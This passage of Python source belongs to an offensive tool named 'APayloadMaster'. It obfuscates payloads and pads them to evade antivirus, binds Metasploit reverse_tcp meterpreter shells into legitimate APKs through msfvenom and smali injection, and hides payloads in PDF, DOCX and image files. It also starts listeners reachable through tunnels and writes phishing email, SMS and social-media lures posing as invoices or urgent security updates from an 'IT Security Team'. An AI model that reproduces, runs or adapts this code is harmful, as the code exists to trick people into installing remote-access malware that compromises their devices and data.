                    key_file = filepath + ".key"
                    with open(key_file, 'wb') as f:
                        f.write(key)
                    print(f"{self.colors.GREEN}[+] Encrypted with AES | Key: {key_file}{self.colors.ENDC}")
                    return encrypted_file
                except ImportError:
                    print(f"{self.colors.YELLOW}[!] PyCryptodome not installed. Install with: pip3 install pycryptodome{self.colors.ENDC}")
                    return filepath
            elif method == "XOR":
                key = os.urandom(32)
                encrypted = bytearray()
                for i, byte in enumerate(data):
                    encrypted.append(byte ^ key[i % len(key)])
                encrypted_file = filepath + ".xor"
                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted)
                key_file = filepath + ".xor.key"
                with open(key_file, 'wb') as f:
                    f.write(key)
                print(f"{self.colors.GREEN}[+] Encrypted with XOR | Key: {key_file}{self.colors.ENDC}")
                return encrypted_file
        except Exception as e:
            print(f"{self.colors.RED}[!] Encryption error: {e}{self.colors.ENDC}")
            return filepath
    
    def obfuscate_payload(self, filepath, level="medium"):
        if filepath.endswith('.py'):
            return self.obfuscate_python_code(filepath)
        try:
            packed_file = filepath + ".packed"
            subprocess.run(["upx", "--best", "-o", packed_file, filepath], capture_output=True)
            if os.path.exists(packed_file):
                print(f"{self.colors.GREEN}[+] Packed with UPX{self.colors.ENDC}")
                return packed_file
        except:
            pass
        return filepath
    
    def obfuscate_python_code(self, filepath):
        with open(filepath, 'r') as f:
            code = f.read()
        encoded = base64.b64encode(code.encode()).decode()
        obfuscated = f'''#!/usr/bin/env python3
# Obfuscated by APayloadMaster
import base64, os, sys
exec(base64.b64decode("{encoded}").decode())
'''
        obfuscated_file = filepath.replace('.py', '_obf.py')
        with open(obfuscated_file, 'w') as f:
            f.write(obfuscated)
        os.chmod(obfuscated_file, 0o755)
        print(f"{self.colors.GREEN}[+] Python code obfuscated{self.colors.ENDC}")
        return obfuscated_file
    
    def evade_av(self, filepath, technique="packer"):
        if technique == "packer":
            try:
                packed_file = filepath + ".upx"
                subprocess.run(["upx", "-9", "-o", packed_file, filepath], capture_output=True)
                if os.path.exists(packed_file):
                    print(f"{self.colors.GREEN}[+] UPX packed for AV evasion{self.colors.ENDC}")
                    return packed_file
            except:
                pass
        with open(filepath, 'ab') as f:
            f.write(os.urandom(1024))
        print(f"{self.colors.GREEN}[+] Added junk bytes for AV evasion{self.colors.ENDC}")
        return filepath
    
    def calculate_hash(self, filepath):
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def get_msf_payload(self, payload_type):
        mapping = {
            "android": "android/meterpreter/reverse_tcp",
            "windows": "windows/meterpreter/reverse_tcp",
            "windows_dll": "windows/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp" if sys.maxsize > 2**32 else "linux/x86/meterpreter/reverse_tcp",
            "python": "python/meterpreter/reverse_tcp",
            "powershell": "windows/x64/meterpreter/reverse_tcp",
            "bash": "generic/shell_reverse_tcp"
        }
        return mapping.get(payload_type, "windows/meterpreter/reverse_tcp")
    
    def ask_start_listener(self):
        if not self.current_payload_type:
            print(f"{self.colors.RED}[!] No payload type set{self.colors.ENDC}")
            return
        if self.current_connection_type in ["ngrok", "pinggy", "serveo", "localxpose", "cloudflare"]:
            listener_host = "0.0.0.0"
            print(f"{self.colors.YELLOW}[*] Tunnel detected: listener will bind to {listener_host}{self.colors.ENDC}")
        else:
            listener_host = self.current_lhost
        choice = input(f"\n{self.colors.YELLOW}[?] Start Metasploit listener? (y/n): {self.colors.ENDC}")
        if choice.lower() == 'y':
            self.start_metasploit_listener(listener_host, self.current_lport, self.current_payload_type)
    
    def start_metasploit_listener(self, lhost, lport, payload_type):
        payload = self.get_msf_payload(payload_type)
        rc_file = f"listener_{lport}.rc"
        rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        print(f"{self.colors.CYAN}[*] Starting Metasploit listener ({payload})...{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Command: msfconsole -r {rc_file}{self.colors.ENDC}")
        def run_listener():
            subprocess.run(["msfconsole", "-r", rc_file])
        thread = threading.Thread(target=run_listener)
        thread.daemon = True
        thread.start()
        print(f"{self.colors.GREEN}[+] Listener started in background{self.colors.ENDC}")
        print(f"{self.colors.YELLOW}[*] Check sessions with: sessions -l{self.colors.ENDC}")
    
    # ===== BINDING/HIDING =====
    
    def binding_menu(self):
        # If no current payload, ask for one
        if not self.current_payload:
            print(f"{self.colors.YELLOW}[!] No payload currently loaded.{self.colors.ENDC}")
            filepath = input(f"{self.colors.YELLOW}[?] Enter path to payload file (or press Enter to cancel): {self.colors.ENDC}")
            if filepath and os.path.exists(filepath):
                self.current_payload = filepath
                self.current_payload_name = os.path.basename(filepath)
                print(f"{self.colors.GREEN}[+] Loaded payload: {self.current_payload}{self.colors.ENDC}")
            else:
                print(f"{self.colors.RED}[!] No payload selected. Returning to main menu.{self.colors.ENDC}")
                return
        
        while True:
            print(f"\n{self.colors.GREEN}[BINDING & HIDING]{self.colors.ENDC}")
            print("="*50)
            print(f"Current payload: {self.current_payload_name}")
            print("0. Load a different payload")
            print("1. Bind with APK file")
            print("2. Bind with PDF file")
            print("3. Bind with DOCX file")
            print("4. Hide in image (steganography)")
            print("5. Generate QR code for download")
            print("6. Create Windows shortcut")
            print("7. Create Android launcher icon")
            print("8. Generate email template")
            print("9. Generate SMS template")
            print("10. Generate social media message")
            print("11. Create download link (HTTP server)")
            print("12. Decrypt encrypted APK")
            print("13. Back")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
            if choice == "13":
                return
            elif choice == "0":
                filepath = input(f"{self.colors.YELLOW}[?] Enter new payload path: {self.colors.ENDC}")
                if os.path.exists(filepath):
                    self.current_payload = filepath
                    self.current_payload_name = os.path.basename(filepath)
                    print(f"{self.colors.GREEN}[+] Switched to payload: {self.current_payload}{self.colors.ENDC}")
                else:
                    print(f"{self.colors.RED}[!] File not found.{self.colors.ENDC}")
                continue
            elif choice == "1":
                self.bind_with_apk()
            elif choice == "2":
                self.bind_with_pdf()
            elif choice == "3":
                self.bind_with_docx()
            elif choice == "4":
                self.hide_in_image_menu()
            elif choice == "5":
                self.generate_qr_code(self.current_payload)
            elif choice == "6":
                self.create_windows_shortcut(self.current_payload)
            elif choice == "7":
                self.create_android_launcher(self.current_payload)
            elif choice == "8":
                self.generate_email_template(self.current_payload)
            elif choice == "9":
                self.generate_sms_template(self.current_payload)
            elif choice == "10":
                self.generate_social_media_message(self.current_payload)
            elif choice == "11":
                self.create_download_link(self.current_payload)
            elif choice == "12":
                self.decrypt_apk_menu()
    
    def bind_with_apk(self):
        if not self.current_lhost or not self.current_lport:
            print(f"{self.colors.RED}[!] No LHOST/LPORT from payload. Please set them manually.{self.colors.ENDC}")
            self.current_lhost = input("LHOST: ")
            self.current_lport = input("LPORT: ")
        
        # Ask user which binding method to use
        print(f"\n{self.colors.CYAN}[BINDING METHOD]{self.colors.ENDC}")
        print("1. Quick (msfvenom) - Original method, may fail with some APKs")
        print("2. Manual (apktool) - More reliable, but requires proper tools")
        method = input(f"{self.colors.YELLOW}[?] Choose method (1 or 2, default 2): {self.colors.ENDC}") or "2"
        
        if method == "1":
            self._bind_with_apk_quick()
        else:
            self._bind_with_apk_manual()
    
    def _bind_with_apk_quick(self):
        """Original msfvenom binding method"""
        # Check for zipalign
        if not shutil.which("zipalign"):
            print(f"{self.colors.RED}[!] zipalign not found. Please install Android SDK build-tools.{self.colors.ENDC}")
            print(f"{self.colors.YELLOW}[*] On Kali: sudo apt install android-sdk-build-tools{self.colors.ENDC}")
            print(f"{self.colors.YELLOW}[*] On Termux: pkg install android-tools{self.colors.ENDC}")
            proceed = input(f"{self.colors.YELLOW}[?] Attempt anyway? (y/n): {self.colors.ENDC}")
            if proceed.lower() != 'y':
                return
        
        # Check apktool version
        if not self.check_apktool_version():
            print(f"{self.colors.RED}[!] Binding requires apktool >= 2.9.2.{self.colors.ENDC}")
            print(f"{self.colors.YELLOW}[*] To upgrade on Kali: sudo apt update && sudo apt install apktool{self.colors.ENDC}")
            print(f"{self.colors.YELLOW}[*] Or download latest from https://ibotpeaches.github.io/Apktool/){self.colors.ENDC}")
            proceed = input(f"{self.colors.YELLOW}[?] Attempt anyway? (y/n): {self.colors.ENDC}")
            if proceed.lower() != 'y':
                return
        
        apk_path = input(f"{self.colors.YELLOW}[?] Enter path to original APK file: {self.colors.ENDC}")
        if not os.path.exists(apk_path):
            print(f"{self.colors.RED}[!] APK file not found{self.colors.ENDC}")
            return
        
        output_name = input(f"{self.colors.YELLOW}[?] Enter output APK name (default: bound_apk.apk): {self.colors.ENDC}") or "bound_apk.apk"
        output_path = f"output/bound/{output_name}"
        
        print(f"{self.colors.CYAN}[*] Binding payload with APK (quick method)...{self.colors.ENDC}")
        
        # Resolve host to IP for msfvenom
        lhost_for_msf = self.resolve_host(self.current_lhost)
        
        try:
            cmd = [
                "msfvenom", "-x", apk_path,
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={lhost_for_msf}", f"LPORT={self.current_lport}",
                "-o", output_path
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            if result.returncode == 0:
                print(f"{self.colors.GREEN}[+] Bound APK created: {output_path}{self.colors.ENDC}")
            else:
                print(f"{self.colors.RED}[!] msfvenom error:{self.colors.ENDC}")
                print(result.stderr)
                # If apksigner missing, try with jarsigner using debug keystore
                if "apksigner not found" in result.stderr:
                    print(f"{self.colors.YELLOW}[*] apksigner not found, trying with jarsigner...{self.colors.ENDC}")
                    keystore_path = os.path.join(os.getcwd(), "debug.keystore")
                    if os.path.exists(keystore_path):
                        cmd2 = [
                            "msfvenom", "-x", apk_path,
                            "-p", "android/meterpreter/reverse_tcp",
                            f"LHOST={lhost_for_msf}", f"LPORT={self.current_lport}",
                            "--keystore", keystore_path,
                            "--keypass", "android",
                            "--storepass", "android",
                            "-o", output_path
                        ]
                        result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=180)
                        if result2.returncode == 0:
                            print(f"{self.colors.GREEN}[+] Bound APK created using jarsigner: {output_path}{self.colors.ENDC}")
                        else:
                            print(f"{self.colors.RED}[!] jarsigner attempt also failed: {result2.stderr}{self.colors.ENDC}")
                    else:
                        print(f"{self.colors.RED}[!] debug.keystore not found, cannot sign. Please install apksigner or create debug.keystore.{self.colors.ENDC}")
                elif "apktool" in result.stderr.lower():
                    print(f"{self.colors.YELLOW}[*] This is likely an apktool version issue. Please upgrade apktool.{self.colors.ENDC}")
                elif "zipalign not found" in result.stderr:
                    print(f"{self.colors.RED}[!] zipalign not found. Please install Android SDK build-tools.{self.colors.ENDC}")
                    print(f"{self.colors.YELLOW}[*] On Kali: sudo apt install android-sdk-build-tools{self.colors.ENDC}")
                    print(f"{self.colors.YELLOW}[*] On Termux: pkg install android-tools{self.colors.ENDC}")
                else:
                    print(f"{self.colors.YELLOW}[*] The quick method failed. You may want to try the manual method (option 2).{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
    
    def _bind_with_apk_manual(self):
        """Enhanced manual binding using apktool and jarsigner"""
        # Check for required tools
        if not shutil.which("apktool"):
            print(f"{self.colors.RED}[!] apktool not found. Please install it.{self.colors.ENDC}")
            return
        if not shutil.which("jarsigner"):
            print(f"{self.colors.RED}[!] jarsigner not found. Please install default-jdk.{self.colors.ENDC}")
            return
        if not shutil.which("zipalign"):
            print(f"{self.colors.YELLOW}[*] zipalign not found. APK will not be aligned (optional).{self.colors.ENDC}")

        apk_path = input(f"{self.colors.YELLOW}[?] Enter path to original APK file: {self.colors.ENDC}")
        if not os.path.exists(apk_path):
            print(f"{self.colors.RED}[!] APK file not found{self.colors.ENDC}")
            return

        # Create working directories
        work_dir = tempfile.mkdtemp(prefix="apk_bind_")
        original_dir = os.path.join(work_dir, "original")
        payload_dir = os.path.join(work_dir, "payload")
        output_apk = os.path.join(work_dir, "unsigned.apk")
        final_apk = os.path.join("output/bound", input(f"{self.colors.YELLOW}[?] Enter output APK name (default: bound_apk.apk): {self.colors.ENDC}") or "bound_apk.apk")
        os.makedirs("output/bound", exist_ok=True)

        try:
            # Step 1: Decompile original APK
            print(f"{self.colors.CYAN}[*] Decompiling original APK...{self.colors.ENDC}")
            result = subprocess.run(["apktool", "d", "-f", "-o", original_dir, apk_path], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{self.colors.RED}[!] Failed to decompile original APK:{self.colors.ENDC}\n{result.stderr}")
                return
            print(f"{self.colors.GREEN}[+] Original APK decompiled.{self.colors.ENDC}")

            # Step 2: Decompile payload APK
            print(f"{self.colors.CYAN}[*] Decompiling payload APK...{self.colors.ENDC}")
            result = subprocess.run(["apktool", "d", "-f", "-o", payload_dir, self.current_payload], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{self.colors.RED}[!] Failed to decompile payload APK:{self.colors.ENDC}\n{result.stderr}")
                return
            print(f"{self.colors.GREEN}[+] Payload APK decompiled.{self.colors.ENDC}")

            # Step 3: Inject payload smali into original
            payload_smali_dirs = [d for d in os.listdir(payload_dir) if d.startswith("smali")]
            if not payload_smali_dirs:
                print(f"{self.colors.RED}[!] No smali directories found in payload.{self.colors.ENDC}")
                return

            for smali_dir in payload_smali_dirs:
                src = os.path.join(payload_dir, smali_dir)
                dst = os.path.join(original_dir, smali_dir)
                if os.path.exists(dst):
                    for root, dirs, files in os.walk(src):
                        rel_path = os.path.relpath(root, src)
                        target_dir = os.path.join(dst, rel_path)
                        os.makedirs(target_dir, exist_ok=True)
                        for file in files:
                            shutil.copy2(os.path.join(root, file), os.path.join(target_dir, file))
                else:
                    shutil.copytree(src, dst)
            print(f"{self.colors.GREEN}[+] Payload smali injected.{self.colors.ENDC}")

            # Step 4: Copy lib and assets
            for folder in ['lib', 'assets']:
                src_folder = os.path.join(payload_dir, folder)
                if os.path.exists(src_folder):
                    dst_folder = os.path.join(original_dir, folder)
                    if os.path.exists(dst_folder):
                        for root, dirs, files in os.walk(src_folder):
                            rel_path = os.path.relpath(root, src_folder)
                            target_dir = os.path.join(dst_folder, rel_path)
                            os.makedirs(target_dir, exist_ok=True)
                            for file in files:
                                shutil.copy2(os.path.join(root, file), os.path.join(target_dir, file))
                    else:
                        shutil.copytree(src_folder, dst_folder)
                    print(f"{self.colors.YELLOW}[*] Copied {folder} folder from payload.{self.colors.ENDC}")

            # Step 5: Modify AndroidManifest.xml
            manifest_path = os.path.join(original_dir, "AndroidManifest.xml")
            if not os.path.exists(manifest_path):
                print(f"{self.colors.RED}[!] AndroidManifest.xml not found in original APK.{self.colors.ENDC}")
                return

            with open(manifest_path, 'r') as f:
                manifest_content = f.read()

            # Add internet permission if missing
            if 'android.permission.INTERNET' not in manifest_content:
                manifest_content = manifest_content.replace('</manifest>', '    <uses-permission android:name="android.permission.INTERNET"/>\n</manifest>')
                print(f"{self.colors.YELLOW}[*] Added INTERNET permission.{self.colors.ENDC}")

            # Find main activity from payload and add it
            payload_manifest = os.path.join(payload_dir, "AndroidManifest.xml")
            if os.path.exists(payload_manifest):
                with open(payload_manifest, 'r') as f:
                    payload_manifest_content = f.read()
                match = re.search(r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?<action android:name="android.intent.action.MAIN"', payload_manifest_content, re.DOTALL)
                if match:
                    main_activity = match.group(1)
                    if main_activity not in manifest_content:
                        manifest_content = manifest_content.replace('</application>', f'        <activity android:name="{main_activity}"/>\n    </application>')
                        print(f"{self.colors.YELLOW}[*] Added main activity {main_activity}.{self.colors.ENDC}")

            # Write manifest
            with open(manifest_path, 'w') as f:
                f.write(manifest_content)

            # Step 6: Fix manifest – remove numeric foregroundServiceType attributes
            print(f"{self.colors.CYAN}[*] Checking manifest for invalid attributes...{self.colors.ENDC}")
            with open(manifest_path, 'r') as f:
                manifest_text = f.read()
            # Regex to remove android:foregroundServiceType="0x..." or android:foregroundServiceType="123"
            pattern = r'\s+android:foregroundServiceType="(0x[0-9A-Fa-f]+|\d+)"'
            new_manifest, count = re.subn(pattern, '', manifest_text)
            if count > 0:
                print(f"{self.colors.YELLOW}[!] Removed {count} invalid foregroundServiceType attribute(s).{self.colors.ENDC}")
                with open(manifest_path, 'w') as f:
                    f.write(new_manifest)
            else:
                print(f"{self.colors.GREEN}[+] No invalid foregroundServiceType found.{self.colors.ENDC}")

            # Step 7: Rebuild APK
            print(f"{self.colors.CYAN}[*] Rebuilding APK...{self.colors.ENDC}")
            rebuild_cmd = ["apktool", "b", "-o", output_apk, original_dir]
            result = subprocess.run(rebuild_cmd, capture_output=True, text=True)
            if result.returncode != 0:
                # Check if --use-aapt1 is supported
                try:
                    help_output = subprocess.run(["apktool", "b", "--help"], capture_output=True, text=True).stdout
                    if "--use-aapt1" in help_output:
                        print(f"{self.colors.YELLOW}[!] Rebuild with aapt2 failed. Retrying with aapt1...{self.colors.ENDC}")
                        rebuild_cmd_aapt1 = ["apktool", "b", "--use-aapt1", "-o", output_apk, original_dir]
                        result = subprocess.run(rebuild_cmd_aapt1, capture_output=True, text=True)
                        if result.returncode != 0:
                            print(f"{self.colors.RED}[!] Failed to rebuild APK even with aapt1:{self.colors.ENDC}\n{result.stderr}")
                            return
                    else:
                        print(f"{self.colors.RED}[!] Rebuild with aapt2 failed and aapt1 flag not supported.{self.colors.ENDC}")
                        print(f"{self.colors.YELLOW}Original error:{self.colors.ENDC}\n{result.stderr}")
                        return
                except Exception as e:
                    print(f"{self.colors.RED}[!] Error checking apktool flags: {e}{self.colors.ENDC}")
                    return
            print(f"{self.colors.GREEN}[+] APK rebuilt.{self.colors.ENDC}")

            # Step 8: Sign the APK
            keystore = "debug.keystore"
            if not os.path.exists(keystore):
                # Create a new keystore
                subprocess.run([
                    "keytool", "-genkey", "-v", "-keystore", keystore,
                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
                    "-validity", "10000", "-storepass", "android", "-keypass", "android",
                    "-dname", "CN=Android Debug,O=Android,C=US"
                ], capture_output=True)

            signed_apk = output_apk + ".signed"
            print(f"{self.colors.CYAN}[*] Signing APK...{self.colors.ENDC}")
            result = subprocess.run([
                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
                "-keystore", keystore, "-storepass", "android", "-keypass", "android",
                output_apk, "androiddebugkey"
            ], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{self.colors.RED}[!] Signing failed:{self.colors.ENDC}\n{result.stderr}")
                return
            print(f"{self.colors.GREEN}[+] APK signed.{self.colors.ENDC}")

            # Step 9: Align (optional)
            if shutil.which("zipalign"):
                aligned_apk = final_apk
                print(f"{self.colors.CYAN}[*] Aligning APK...{self.colors.ENDC}")
                result = subprocess.run(["zipalign", "-v", "-p", "4", output_apk, aligned_apk], capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"{self.colors.YELLOW}[!] Alignment failed, using unaligned APK.{self.colors.ENDC}")
                    shutil.copy2(output_apk, final_apk)
                else:
                    print(f"{self.colors.GREEN}[+] APK aligned.{self.colors.ENDC}")
            else:
                shutil.copy2(output_apk, final_apk)

            print(f"{self.colors.GREEN}[+] Bound APK created: {final_apk}{self.colors.ENDC}")

        except Exception as e:
            print(f"{self.colors.RED}[!] Error during binding: {e}{self.colors.ENDC}")
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
    
    def bind_with_pdf(self):
        pdf_path = input(f"{self.colors.YELLOW}[?] Enter path to original PDF file: {self.colors.ENDC}")
        if not os.path.exists(pdf_path):
            print(f"{self.colors.RED}[!] PDF file not found{self.colors.ENDC}")
            return
        output_name = input(f"{self.colors.YELLOW}[?] Enter output PDF name (default: bound.pdf): {self.colors.ENDC}") or "bound.pdf"
        output_path = f"output/bound/{output_name}"
        try:
            with open(pdf_path, 'rb') as f_pdf:
                pdf_data = f_pdf.read()
            with open(self.current_payload, 'rb') as f_payload:
                payload_data = f_payload.read()
            with open(output_path, 'wb') as f_out:
                f_out.write(pdf_data)
                f_out.write(b"\n<!-- PAYLOAD START -->\n")
                f_out.write(payload_data)
            print(f"{self.colors.GREEN}[+] Payload appended to PDF: {output_path}{self.colors.ENDC}")
            print(f"{self.colors.YELLOW}[!] Note: This may not execute automatically. Use social engineering.{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
    
    def bind_with_docx(self):
        docx_path = input(f"{self.colors.YELLOW}[?] Enter path to original DOCX file: {self.colors.ENDC}")
        if not os.path.exists(docx_path):
            print(f"{self.colors.RED}[!] DOCX file not found{self.colors.ENDC}")
            return
        output_name = input(f"{self.colors.YELLOW}[?] Enter output DOCX name (default: bound.docx): {self.colors.ENDC}") or "bound.docx"
        output_path = f"output/bound/{output_name}"
        try:
            import zipfile
            with zipfile.ZipFile(docx_path, 'r') as zin:
                with zipfile.ZipFile(output_path, 'w') as zout:
                    for item in zin.infolist():
                        zout.writestr(item, zin.read(item.filename))
                    zout.write(self.current_payload, arcname=os.path.basename(self.current_payload))
            print(f"{self.colors.GREEN}[+] Payload added to DOCX: {output_path}{self.colors.ENDC}")
            print(f"{self.colors.YELLOW}[!] User would need to extract and run the payload.{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
    
    def hide_in_image_menu(self):
        print(f"\n{self.colors.CYAN}[STEGANOGRAPHY]{self.colors.ENDC}")
        print("1. Use existing image")
        print("2. Download random image")
        print("3. Back")
        choice = input(f"{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
        if choice == "1":
            image_path = input(f"{self.colors.YELLOW}[?] Enter image path: {self.colors.ENDC}")
            if os.path.exists(image_path):
                self.hide_in_image(self.current_payload, image_path)
        elif choice == "2":
            self.download_and_hide_image(self.current_payload)
    
    def hide_in_image(self, payload_path, image_path):
        if not shutil.which("steghide"):
            print(f"{self.colors.RED}[!] steghide not installed. Install with: sudo apt install steghide{self.colors.ENDC}")
            return
        output_image = f"output/bound/{os.path.basename(image_path)}_hidden.jpg"
        try:
            cmd = ["steghide", "embed", "-cf", image_path, "-ef", payload_path, "-sf", output_image, "-p", ""]
            result = subprocess.run(cmd, capture_output=True, text=True, input="\n")
            if result.returncode == 0:
                print(f"{self.colors.GREEN}[+] Payload hidden in image: {output_image}{self.colors.ENDC}")
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
    
    def download_and_hide_image(self, payload_path):
        try:
            import requests
            url = "https://source.unsplash.com/random/800x600"
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                image_path = f"output/bound/random_{int(time.time())}.jpg"
                with open(image_path, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
                print(f"{self.colors.GREEN}[+] Image downloaded: {image_path}{self.colors.ENDC}")
                self.hide_in_image(payload_path, image_path)
            else:
                print(f"{self.colors.RED}[!] Failed to download image{self.colors.ENDC}")
        except ImportError:
            print(f"{self.colors.RED}[!] Requests module not installed{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
    
    def generate_qr_code(self, filepath):
        try:
            import qrcode
        except ImportError:
            print(f"{self.colors.RED}[!] QRCode module not installed. Install with: pip3 install qrcode[pil]{self.colors.ENDC}")
            return
        self.start_http_server(8080, serve_path=filepath, foreground=False)
        filename = os.path.basename(filepath)
        qr_data = f"http://{self.local_ip}:8080/{urllib.parse.quote(filename)}"
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(qr_data)
        qr.make(fit=True)
        img = qr.make_image(fill='black', back_color='white')
        qr_file = f"output/bound/{filename}_qr.png"
        img.save(qr_file)
        print(f"{self.colors.GREEN}[+] QR code generated: {qr_file}{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Scan to download: {qr_data}{self.colors.ENDC}")
    
    def create_windows_shortcut(self, filepath):
        shortcut_content = f'''[InternetShortcut]
URL=file:///{os.path.abspath(filepath).replace(os.sep, '/')}
IconIndex=0
'''
        shortcut_file = f"output/bound/{os.path.basename(filepath)}.url"
        with open(shortcut_file, 'w') as f:
            f.write(shortcut_content)
        print(f"{self.colors.GREEN}[+] Windows shortcut created: {shortcut_file}{self.colors.ENDC}")
    
    def create_android_launcher(self, filepath):
        launcher_content = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.launcher.app">
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@style/AppTheme">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
'''
        launcher_file = f"output/bound/{os.path.basename(filepath)}_launcher.xml"
        with open(launcher_file, 'w') as f:
            f.write(launcher_content)
        print(f"{self.colors.GREEN}[+] Android launcher config created: {launcher_file}{self.colors.ENDC}")
    
    def start_http_server(self, port=8080, global_access=False, serve_path=None, foreground=False):
        """
        Start HTTP server serving the given path (file or directory).
        If foreground=True, run in current thread (blocking). Otherwise, run in background thread.
        """
        if self.http_server and not foreground:
            print(f"{self.colors.YELLOW}[*] HTTP server already running in background{self.colors.ENDC}")
            return

        # Determine what to serve
        if serve_path is None:
            serve_path = "server/uploads"
            if self.current_payload:
                shutil.copy2(self.current_payload, serve_path)
        elif os.path.isfile(serve_path):
            # If it's a file, we serve its directory and the file will be accessible
            serve_dir = os.path.dirname(serve_path)
            if not serve_dir:
                serve_dir = "."
            # Change to that directory
            original_dir = os.getcwd()
            os.chdir(serve_dir)
            print(f"{self.colors.GREEN}[*] Serving file: {os.path.basename(serve_path)} from {serve_dir}{self.colors.ENDC}")
        elif os.path.isdir(serve_path):
            original_dir = os.getcwd()
            os.chdir(serve_path)
            print(f"{self.colors.GREEN}[*] Serving directory: {serve_path}{self.colors.ENDC}")
        else:
            print(f"{self.colors.RED}[!] Invalid serve path.{self.colors.ENDC}")
            return

        class FileHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                # Simple log without colors to avoid AttributeError
                print(f"[HTTP] {args[0]} - {args[1]}")

        def run_server():
            with socketserver.TCPServer(("", int(port)), FileHandler) as httpd:
                self.http_server = httpd if not foreground else None
                print(f"{self.colors.GREEN}[+] HTTP server started on port {port}{self.colors.ENDC}")
                print(f"{self.colors.CYAN}[*] Serving files from: {os.getcwd()}{self.colors.ENDC}")
                if global_access:
                    print(f"{self.colors.CYAN}[*] Global access enabled via tunnel{self.colors.ENDC}")
                try:
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print(f"\n{self.colors.YELLOW}[*] Server stopped{self.colors.ENDC}")
                finally:
                    if foreground:
                        # Return to original directory
                        os.chdir(original_dir)

        if foreground:
            # Run in current thread (blocking)
            try:
                run_server()
            except KeyboardInterrupt:
                pass
            finally:
                # After server stops, we return to menu automatically
                pass
        else:
            # Background thread
            thread = threading.Thread(target=run_server)
            thread.daemon = True
            thread.start()
            # Change back to original dir for the main thread
            os.chdir(original_dir)
    
    def generate_email_template(self, filepath, base_url):
        filename = os.path.basename(filepath)
        download_url = f"{base_url}/{filename}"
        template = f"""
=== EMAIL TEMPLATE ===
Subject: Important Document / Invoice / Update

Body:
Dear User,

Please find attached the important document you requested.
You can also download it from: {download_url}

Best regards,
[Your Name]

=== OR ===

Subject: Security Update Required

Body:
Your account requires immediate security update.
Download and run the attached file to apply the patch.

Download link: {download_url}

Thank you,
IT Security Team
"""
        template_file = f"output/distribution/email_template_{filename}.txt"
        os.makedirs("output/distribution", exist_ok=True)
        with open(template_file, 'w') as f:
            f.write(template)
        print(f"{self.colors.GREEN}[+] Email template saved: {template_file}{self.colors.ENDC}")
    
    def generate_sms_template(self, filepath, base_url):
        filename = os.path.basename(filepath)
        download_url = f"{base_url}/{filename}"
        template = f"""
=== SMS TEMPLATE ===

Option 1:
Hi! Here's the file you requested: {download_url}

Option 2:
Urgent: Security update required. Download: {download_url}

Option 3:
Your document is ready: {download_url}
"""
        template_file = f"output/distribution/sms_template_{filename}.txt"
        os.makedirs("output/distribution", exist_ok=True)
        with open(template_file, 'w') as f:
            f.write(template)
        print(f"{self.colors.GREEN}[+] SMS template saved: {template_file}{self.colors.ENDC}")
    
    def generate_social_media_message(self, filepath, base_url):
        filename = os.path.basename(filepath)
        download_url = f"{base_url}/{filename}"
        template = f"""
=== SOCIAL MEDIA TEMPLATE ===

Twitter:
Check out this cool app I found! It's super useful. Download here: {download_url}

Facebook:
Hey friends! I just found this amazing tool that you all should try.
Get it from: {download_url}

Instagram (Bio):
Latest tool download: {download_url}

Discord/Telegram:
New tool release! Download from: {download_url}
"""
        template_file = f"output/distribution/social_media_{filename}.txt"
        os.makedirs("output/distribution", exist_ok=True)
        with open(template_file, 'w') as f:
            f.write(template)
        print(f"{self.colors.GREEN}[+] Social media template saved: {template_file}{self.colors.ENDC}")
    
    def distribution_menu(self, filepath):
        """Enhanced distribution: choose file and make it global via tunnel."""
        # Ask which file to distribute
        print(f"\n{self.colors.CYAN}[DISTRIBUTION OPTIONS]{self.colors.ENDC}")
        print("1. Use current payload")
        print("2. Choose a file from output/payloads")
        print("3. Choose a file from output/bound")
        print("4. Enter custom path")
        print("5. Cancel")
        choice = input(f"{self.colors.YELLOW}[?] Select option (1-5, default 1): {self.colors.ENDC}") or "1"
        
        selected_file = None
        if choice == "1":
            selected_file = filepath
        elif choice == "2":
